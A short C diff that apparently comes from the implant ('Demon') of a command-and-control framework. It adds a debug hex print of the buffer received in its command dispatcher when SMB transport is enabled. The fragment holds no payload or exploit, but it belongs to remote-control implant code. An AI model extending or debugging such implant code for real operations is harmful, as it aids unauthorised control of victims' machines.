@@ -68,6 +68,9 @@ VOID CommandDispatcher( VOID )
         PackageAddInt32( Package, Instance->Session.DemonID );
         PackageTransmit( Package, &DataBuffer, &DataBufferSize );
 
+#ifdef TRANSPORT_SMB
+        PRINT_HEX( DataBuffer, DataBufferSize )
+#endif
         if ( DataBuffer && DataBufferSize > 0 )
         {
             ParserNew( &Parser, DataBuffer, DataBufferSize );
